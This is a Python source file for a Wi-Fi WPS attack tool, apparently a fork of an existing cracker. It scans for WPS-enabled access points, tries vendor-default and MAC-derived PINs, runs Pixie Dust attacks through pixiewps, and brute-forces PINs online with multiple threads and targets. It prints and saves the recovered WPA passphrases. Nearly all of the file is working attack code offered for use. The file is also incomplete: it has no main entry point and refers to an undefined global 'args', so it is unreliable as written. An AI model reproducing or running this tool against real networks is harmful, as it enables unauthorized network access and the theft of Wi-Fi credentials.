#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# trieupham 0.0.3 (c) 2023 rofl0r, drygdryg modded by vladimir127001, enhanced by Grok
# A WPS attack tool for scanning and cracking Wi-Fi networks with WPS enabled
# Requires root privileges and Python 3.6+
# Supports Pixie Dust attack, bruteforce, and push-button connection
# Fixed all syntax errors for compatibility with Termux
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import statistics
import csv
from pathlib import Path
from typing import Dict
import threading
from concurrent.futures import ThreadPoolExecutor
import psutil  # For resource monitoring
import argparse

class NetworkAddress:
    """Class to handle MAC address conversions between string and integer representations."""
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other
        return self

    def __isub__(self, other):
        self.integer -= other
        return self

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        """Convert MAC address string to integer."""
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        """Convert integer to MAC address string."""
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'

class WPSpin:
    """WPS PIN generator for various algorithms."""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7851517},
        }

    def pin24(self, mac):
        """Generate 24-bit WPS PIN based on MAC address."""
        mac = NetworkAddress(mac)
        return (mac.integer & 0xFFFFFF) % 10000000

    def pin28(self, mac):
        """Generate 28-bit WPS PIN based on MAC address."""
        mac = NetworkAddress(mac)
        return (mac.integer & 0xFFFFFFF) % 10000000

    def pin32(self, mac):
        """Generate 32-bit WPS PIN based on MAC address."""
        mac = NetworkAddress(mac)
        return mac.integer % 10000000

    def pinDLink(self, mac):
        """Generate D-Link specific WPS PIN."""
        mac = NetworkAddress(mac)
        mac -= 1
        pin = mac.integer % 10000000
        return self.checksum(pin)

    def pinDLink1(self, mac):
        """Generate D-Link specific WPS PIN +1."""
        mac = NetworkAddress(mac)
        pin = mac.integer % 10000000
        return self.checksum(pin)

    def pinASUS(self, mac):
        """Generate ASUS specific WPS PIN."""
        mac = NetworkAddress(mac).string
        mac = mac.replace(':', '')
        p = int(mac[6:], 16) % 10000000
        return self.checksum(p)

    def pinAirocon(self, mac):
        """Generate Airocon Realtek specific WPS PIN."""
        mac = NetworkAddress(mac).string
        mac = mac.replace(':', '')
        p = int(mac[6:], 16)
        p ^= int(mac[:6], 16)
        return self.checksum(p % 10000000)

    @staticmethod
    def checksum(pin):
        """Calculate WPS PIN checksum."""
        accum = 0
        t = pin
        while t:
            accum += (3 * (t % 10))
            t //= 10
            accum += (t % 10)
            t //= 10
        return (pin * 10) + ((10 - accum % 10) % 10)

    def getLikely(self, mac):
        """Get the most likely PIN for a given MAC address."""
        for algo in self.algos.values():
            if algo['mode'] == self.ALGO_MAC:
                pin = algo['gen'](mac)
                if pin:
                    return f'{pin:08d}'
        return None

class PixiewpsData:
    """Class to store Pixiewps attack data."""
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        """Reset all Pixiewps data."""
        self.__init__()

    def got_all(self):
        """Check if all required Pixiewps data is collected."""
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        """Generate Pixiewps command."""
        pixiecmd = f"pixiewps --pke {self.pke} --pkr {self.pkr} --e-hash1 {self.e_hash1} --e-hash2 {self.e_hash2} --authkey {self.authkey} --e-nonce {self.e_nonce}"
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd

class BruteforceStatus:
    """Class to track bruteforce progress."""
    def __init__(self):
        self.attempts = []
        self.start_time = datetime.now()
        self.mask = '0000'

    def registerAttempt(self, mask):
        """Register a bruteforce attempt."""
        self.attempts.append((mask, time.time()))
        self.mask = mask

    def getETA(self):
        """Calculate estimated time of arrival for bruteforce completion."""
        if len(self.attempts) < 2:
            return 'unknown'
        times = [t for _, t in self.attempts]
        deltas = [times[i + 1] - times[i] for i in range(len(times) - 1)]
        avg = statistics.mean(deltas)
        remaining = (10000 - int(self.mask[:4])) * 1000 if len(self.mask) == 4 else (1000 - int(self.mask[4:]))
        seconds = remaining * avg
        return f'{int(seconds // 3600)}h {int((seconds % 3600) // 60)}m {int(seconds % 60)}s'

class ConnectionStatus:
    """Class to track connection status."""
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''

    def isFirstHalfValid(self):
        """Check if the first half of the PIN is valid."""
        return self.last_m_message > 5

    def clear(self):
        """Reset connection status."""
        self.__init__()

def show_toast(message):
    """Display a toast notification using termux-toast."""
    try:
        subprocess.run(['termux-toast', message], check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Failed to show toast: {message}")

class Companion:
    """Main class for handling WPS attacks."""
    def __init__(self, interface, save_result=False, print_debug=False, threads=1, battery_threshold=20, max_attempts=5, use_gui=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.threads = threads
        self.battery_threshold = battery_threshold
        self.max_attempts = max_attempts
        self.use_gui = use_gui
        self.failed_attempts = {}
        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.tempdir}\nctrl_interface_group=root\nupdate_config=1\n')
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.pixiefite/sessions/'
        self.pixiewps_dir = f'{user_home}/.pixiefite/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)

        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        """Initialize wpa_supplicant process."""
        print('[*] Running wpa_supplicant…')
        cmd = f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{self.interface} -c{self.tempconf}'
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError(f'wpa_supplicant returned an error: {self.wpas.communicate()[0]}')
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def check_resources(self):
        """Check device resources (battery and CPU)."""
        try:
            battery = psutil.sensors_battery()
            if battery and battery.percent < self.battery_threshold and not battery.power_plugged:
                print(f"[!] Battery level too low ({battery.percent}%). Please charge your device.")
                if self.use_gui:
                    show_toast(f"Battery low: {battery.percent}%")
                return False
            cpu_percent = psutil.cpu_percent(interval=1)
            if cpu_percent > 90:
                print(f"[!] CPU usage too high ({cpu_percent}%). Pausing for 10 seconds...")
                if self.use_gui:
                    show_toast(f"High CPU usage: {cpu_percent}%")
                time.sleep(10)
                return False
        except Exception as e:
            print(f"[!] Error checking resources: {e}")
            return False
        return True

    def sendOnly(self, command):
        """Send a command to wpa_supplicant without expecting a response."""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Send a command to wpa_supplicant and receive response."""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        """Explain wpa_supplicant error status."""
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        """Handle wpa_supplicant output."""
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = line.split('hexdump: ')[1].replace(' ', '')
            elif 'DH Public Key' in line and 'hexdump' in line:
                if 'own' in line:
                    self.pixie_creds.pke = line.split('hexdump: ')[1].replace(' ', '')
                else:
                    self.pixie_creds.pkr = line.split('hexdump: ')[1].replace(' ', '')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = line.split('hexdump: ')[1].replace(' ', '')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = line.split('hexdump: ')[1].replace(' ', '')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = line.split('hexdump: ')[1].replace(' ', '')
            elif 'Building Message M' in line:
                self.connection_status.last_m_message = int(line[-1])
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
            elif 'WPS registration protocol failed' in line:
                self.connection_status.status = 'WPS_FAIL'
        elif line.startswith('WPA: '):
            if 'key negotiation completed' in line:
                self.connection_status.status = 'GOT_PSK'
        elif line.startswith('BSSID'):
            self.connection_status.bssid = line.split()[1].upper()
        elif line.startswith('SSID'):
            self.connection_status.essid = line.split('SSID ')[1].strip("'")
        elif line.startswith('wpa_psk'):
            self.connection_status.wpa_psk = line.split('wpa_psk=')[1].strip()
        return True

    def __credentialPrint(self, pin, psk, essid):
        """Print credentials to console."""
        print(f'\n[+] Credentials obtained!')
        print(f'[*] BSSID: {self.connection_status.bssid}')
        print(f'[*] ESSID: {essid}')
        print(f'[*] PIN: {pin}')
        print(f'[*] PSK: {psk}')

    def __saveResult(self, bssid, essid, pin, psk):
        """Save credentials to file."""
        filename = f"{self.reports_dir}{bssid.replace(':', '')}.txt"
        with open(filename, 'a', encoding='utf-8') as file:
            file.write(f'BSSID: {bssid}\n')
            file.write(f'ESSID: {essid}\n')
            file.write(f'PIN: {pin}\n')
            file.write(f'PSK: {psk}\n')
            file.write(f'Time: {datetime.now()}\n\n')
        print(f'[+] Credentials saved to {filename}')

    def __savePin(self, bssid, pin):
        """Save PIN to file for future attempts."""
        filename = f"{self.pixiewps_dir}{bssid.replace(':', '').upper()}.run"
        with open(filename, 'w') as file:
            file.write(pin)
        print(f'[i] PIN saved in {filename}')

    def __runPixiewps(self, showcmd, force):
        """Run Pixiewps to obtain WPS PIN."""
        cmd = self.pixie_creds.get_pixie_cmd(full_range=force)
        if showcmd:
            print(f'[*] Running: {cmd}')
        try:
            process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    encoding='utf-8', errors='replace')
            for line in process.stdout.splitlines():
                if '[+] WPS pin: ' in line:
                    pin = line.split(': ')[1].strip()
                    return pin
        except subprocess.CalledProcessError as e:
            print(f"[!] Pixiewps failed: {e.stderr}")
        return None

    def __prompt_wpspin(self, bssid):
        """Prompt user for WPS PIN or generate one."""
        print(f'[*] Available WPS PIN algorithms for {bssid}:')
        for i, algo in enumerate(self.generator.algos.values(), 1):
            print(f'{i}) {algo["name"]}')
        try:
            choice = int(input('Select algorithm (press Enter for default PIN): '))
            if 1 <= choice <= len(self.generator.algos):
                algo = list(self.generator.algos.values())[choice - 1]
                if algo['mode'] == self.generator.ALGO_MAC:
                    return f'{algo["gen"](bssid):08d}'
                return f'{algo["gen"](bssid)}'
        except ValueError:
            pass
        return None

    def __wps_connection(self, bssid, pin=None, pixiemode=False, pbc_mode=False, verbose=False):
        """Perform WPS connection attempt."""
        self.connection_status.clear()
        self.pixie_creds.clear()
        self.wpas.stdout.read(300)
        if pbc_mode:
            if bssid:
                print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}' on {bssid}…")
            if self.use_gui:
                show_toast(f"Trying PIN {pin} on {bssid}")
            cmd = f'WPS_REG {bssid} {pin}'
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        self.sendOnly('WPS_CANCEL')
        return True

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                         pixieforce=False, store_pin_on_fail=False):
        """Perform a single WPS connection attempt."""
        if not self.check_resources():
            return False

        if bssid not in self.failed_attempts:
            self.failed_attempts[bssid] = 0

        if self.failed_attempts[bssid] >= self.max_attempts:
            print(f"[!] Skipping {bssid}: Too many failed attempts ({self.failed_attempts[bssid]}/{self.max_attempts})")
            if self.use_gui:
                show_toast(f"Skipping {bssid}: Too many failed attempts")
            return False

        if not pin:
            if pixiemode:
                try:
                    filename = f"{self.pixiewps_dir}{bssid.replace(':', '').upper()}.run"
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                pin = self.__prompt_wpspin(bssid) or '12345670'

        try:
            self.__wps_connection(bssid, pin, pixiemode, pbc_mode)
        except KeyboardInterrupt:
            print("\n[!] Aborted by user")
            if store_pin_on_fail:
                self.__savePin(bssid, pin)
            return False

        if self.connection_status.status == 'GOT_PSK':
            if self.use_gui:
                show_toast(f"Success! WPA PSK: {self.connection_status.wpa_psk}")
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                filename = f"{self.pixiewps_dir}{bssid.replace(':', '').upper()}.run"
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            self.failed_attempts[bssid] = 0
            return True
        elif pixiemode and self.pixie_creds.got_all():
            pin = self.__runPixiewps(showpixiecmd, pixieforce)
            if pin:
                return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
            print('[!] Pixie Dust attack failed')
            self.failed_attempts[bssid] += 1
            return False
        else:
            if store_pin_on_fail:
                self.__savePin(bssid, pin)
            self.failed_attempts[bssid] += 1
            if self.failed_attempts[bssid] >= self.max_attempts:
                print(f"[!] {bssid} may have lockout mechanism. Skipping...")
                if self.use_gui:
                    show_toast(f"{bssid} may have lockout mechanism. Skipping...")
            return False

    def __first_half_bruteforce_thread(self, bssid, f_half_start, f_half_end, delay=None):
        """Thread for bruteforcing first half of WPS PIN."""
        checksum = self.generator.checksum
        f_half = f_half_start
        while int(f_half) < f_half_end:
            if not self.check_resources():
                return None
            t = int(f_half + '000')
            pin = f'{f_half}000{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print(f'[+] First half found: {f_half}')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                return self.__first_half_bruteforce_thread(bssid, f_half, f_half_end, delay)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        return None

    def __first_half_bruteforce(self, bssid, f_half, delay=None, threads=None):
        """Bruteforce first half of WPS PIN using multiple threads."""
        if threads is None:
            threads = self.threads
        range_size = 10000 // threads
        futures = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(threads):
                start = str(i * range_size).zfill(4)
                end = str((i + 1) * range_size).zfill(4) if i < threads - 1 else '10000'
                futures.append(executor.submit(self.__first_half_bruteforce_thread, bssid, start, end, delay))
            for future in futures:
                f_half = future.result()
                if f_half:
                    return f_half
        print('[-] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """Bruteforce second half of WPS PIN."""
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            if not self.check_resources():
                return False
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None, threads=None):
        """Perform smart bruteforce attack on WPS PIN."""
        if not self.check_resources():
            raise SystemExit("Aborting due to low resources.")
        if threads is None:
            threads = self.threads
        if (not start_pin) or (len(start_pin) < 4):
            try:
                filename = f"{self.sessions_dir}{bssid.replace(':', '').upper()}.run"
                with open(filename, 'r') as file:
                    if input(f'[?] Restore previous session for {bssid}? [n/Y] ').lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay, threads)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    return self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                return self.__second_half_bruteforce(bssid, f_half, s_half, delay)
        except KeyboardInterrupt:
            print("\nAborting…")
            filename = f"{self.sessions_dir}{bssid.replace(':', '').upper()}.run"
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print(f'[i] Session saved in {filename}')
            if args.loop:
                return False
            raise SystemExit("Program terminated by user")

    def attack_multi_ap(self, bssids, pixiemode=False, showpixiecmd=False, pixieforce=False):
        """Attack multiple APs simultaneously."""
        results = []
        with ThreadPoolExecutor(max_workers=len(bssids)) as executor:
            futures = [executor.submit(self.single_connection, bssid, None, pixiemode, False, showpixiecmd, pixieforce) for bssid in bssids]
            for future in futures:
                results.append(future.result())
        return results

    def cleanup(self):
        """Clean up resources."""
        try:
            if hasattr(self, 'retsock'):
                self.retsock.close()
            if hasattr(self, 'wpas'):
                self.wpas.terminate()
                self.wpas.wait()
            if hasattr(self, 'res_socket_file') and os.path.exists(self.res_socket_file):
                os.remove(self.res_socket_file)
            if hasattr(self, 'tempdir') and os.path.exists(self.tempdir):
                shutil.rmtree(self.tempdir, ignore_errors=True)
            if hasattr(self, 'tempconf') and os.path.exists(self.tempconf):
                os.remove(self.tempconf)
        except Exception as e:
            print(f"[!] Error during cleanup: {e}")

class WiFiScanner:
    """Class to scan for Wi-Fi networks with WPS support."""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append((row[1], row[2]))
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Scan for Wi-Fi networks using iw command."""
        def handle_network(line, result, networks):
            networks.append({
                'Security type': 'Unknown',
                'WPS': False,
                'WPS locked': False,
                'Model': '',
                'Model number': '',
                'Device name': '',
                'Vulnerable': False
            })
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            if self.vuln_list and (f"{networks[-1]['Model']} {networks[-1]['Model number']}" in self.vuln_list):
                networks[-1]['Vulnerable'] = True

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = f'iw dev {self.interface} scan'
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print(f'[!] Error: {line}')
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        networks.sort(key=lambda x: (-x['Vulnerable'], x['Level']), reverse=True)
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        def truncateStr(s, length, postfix='…'):
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=None):
            if color:
                if color == 'green':
                    text = f'\033[92m{text}\033[00m'
                elif color == 'red':
                    text = f'\033[91m{text}\033[00m'
                elif color == 'yellow':
                    text = f'\033[93m{text}\033[00m'
                else:
                    return text
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                colored('WPS locked', color='red'),
                colored('Already stored', color='yellow')
            ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = f"{network['Model']} {network['Model number']}"
            essid = truncateStr(network.get('ESSID', '<Hidden>'), 25)
            deviceName = truncateStr(network['Device name'], 27)
            line = f"{number:<4} {network['BSSID']:<18} {essid:<25} {network['Security type']:<8} {network['Level']:<4} {deviceName:<27} {model:<}"
            if (network['BSSID'], network.get('ESSID', '<Hidden>')) in self.stored:
                print(colored(line, color='yellow'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif network['Vulnerable']:
                print(colored(line, color='green'))
            else:
                print(line)

        return network_list

    def prompt_network(self, multi_ap=False, max_targets=3):
        """Prompt user to select a network or multiple networks."""
        networks = self.iw_scanner()
        if not networks:
            print('[-] No WPS networks found.')
            return None if not multi_ap else []
        if multi_ap:
            print(f"[*] Selecting up to {max_targets} targets for multi-AP attack...")
            targets = []
            for i in range(1, min(max_targets + 1, len(networks) + 1)):
                target = networks[i]['BSSID']
                targets.append(target)
                print(f"[+] Added target {i}: {target} (ESSID: {networks[i]['ESSID']})")
            return targets
        else:
            while True:
                try:
                    networkNo = input('Select target (press Enter to refresh): ')
                    if networkNo.lower() in ('r', '0', ''):
                        return self.prompt_network(multi_ap, max_targets)
                    elif int(networkNo) in networks.keys():
                        return networks[int(networkNo)]['BSSID']
                    else:
                        raise IndexError
                except Exception:
                    print('Invalid number')

def ifaceUp(iface, down=False):
    """Bring network interface up or down."""
    action = 'down' if down else 'up'
    cmd = f'ip link set {iface} {action}'
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    return res.returncode == 0

def die(msg):
    """Print error message and exit."""
    sys.stderr.write(msg + '\n')
    sys.exit(1)

def usage():
    """Return usage information."""
    return """
trieupham 0.0.3 (c) 2023 rofl0r, drygdryg modded by vladimir127001, enhanced by Grok

%(prog)s <commands>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
    --push-button-connect    : Run WPS push button connection

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnlist.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks
    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
    -v, --verbose            : Verbose output
    --threads=<n>            : Number of threads for bruteforce (default: 1)
    --multi-ap               : Attack multiple APs simultaneously (up to 3 targets)
    --gui                    : Use GUI notifications via termux-toast
    --battery-threshold=<n>  : Minimum battery percentage to continue (default: 20)
    --max-attempts=<n>       : Maximum failed attempts before skipping an AP (default: 5)

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K --threads 4 --multi-ap --gui
"""

